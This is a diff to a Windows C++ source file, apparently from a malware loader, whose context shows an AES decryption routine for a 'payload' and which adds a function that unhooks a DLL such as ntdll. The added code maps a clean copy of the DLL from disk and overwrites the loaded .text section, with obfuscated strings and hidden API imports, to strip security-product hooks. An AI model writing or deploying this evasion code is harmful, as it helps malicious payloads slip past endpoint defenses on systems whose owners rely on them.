@@ -787,3 +787,76 @@ bool AESDecrypt(_Inout_ BYTE* payload, _In_ DWORD payload_len, _In_ BYTE* key, _
 
 	return true;
 }
+
+bool UnhookDll(_In_ LPCWSTR lpszDllName)
+{
+	MODULEINFO mi = { 0 };
+	DWORD oldProtection = 0;
+	LPVOID ntdllBase = nullptr;
+	wil::unique_handle ntdllFile;
+	wil::unique_handle ntdllMapping;
+	wil::unique_hmodule ntdllModule;
+	LPVOID ntdllMappingAddress = nullptr;
+	PIMAGE_DOS_HEADER hookedDosHeader = nullptr;
+	PIMAGE_NT_HEADERS hookedNtHeader = nullptr;
+	PIMAGE_SECTION_HEADER hookedSectionHeader = nullptr;
+	bool isProtected = false;
+	wchar_t lpszDllPath[MAX_PATH + 1] = { 0 };
+
+	ntdllModule.reset(LI_FN(GetModuleHandleW)(lpszDllName));
+	if (!ntdllModule)
+	{
+		PRINTLASTERROR(L"UnhookDll - ");
+		return false;
+	}
+
+	if (!LI_FN(GetModuleFileNameW)(ntdllModule.get(), lpszDllPath, MAX_PATH))
+	{
+		PRINTLASTERROR(L"UnhookDll - ");
+		return false;
+	}
+
+	if (!LI_FN(K32GetModuleInformation)(GetCurrentProcess(), ntdllModule.get(), &mi, sizeof(mi)))
+	{
+		PRINTLASTERROR(L"UnhookDll - ");
+		return false;
+	}
+
+	ntdllBase = (LPVOID)mi.lpBaseOfDll;
+	ntdllFile.reset(CreateFileW(lpszDllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr));
+	if (!ntdllFile.is_valid())
+	{
+		PRINTLASTERROR(L"UnhookDll - ");
+		return false;
+	}
+
+	ntdllMapping.reset(LI_FN(CreateFileMappingW)(ntdllFile.get(), nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr));
+	if (!ntdllMapping.is_valid())
+	{
+		PRINTLASTERROR(L"UnhookDll - ");
+		return false;
+	}
+
+	ntdllMappingAddress = LI_FN(MapViewOfFile)(ntdllMapping.get(), FILE_MAP_READ, 0, 0, 0);
+	if (!ntdllMappingAddress)
+	{
+		PRINTLASTERROR(L"UnhookDll - ");
+		return false;
+	}
+
+	hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
+	hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
+
+	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
+		hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+
+		if (strcmp((char*)hookedSectionHeader->Name, OBFUSCATED(".text")) == 0) {
+			isProtected = LI_FN(VirtualProtect)((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
+			isProtected = LI_FN(VirtualProtect)((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
+			WPRINTF(L"[+] Dll %ws successfully unhooked!\n", lpszDllName);
+		}
+	}
+
+	return true;
+}
